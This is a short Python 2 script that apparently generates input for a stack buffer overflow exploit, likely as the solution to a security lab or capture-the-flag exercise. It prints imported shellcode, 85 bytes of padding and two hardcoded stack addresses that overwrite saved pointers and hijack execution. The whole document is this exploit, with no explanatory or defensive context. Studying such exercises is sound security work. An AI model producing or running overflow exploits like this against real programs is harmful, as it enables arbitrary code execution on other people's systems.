from shellcode import shellcode

print shellcode+"\x01" *85 + "\x18\xe3\xfe\xbf\x8c\xe2\xfe\xbf"
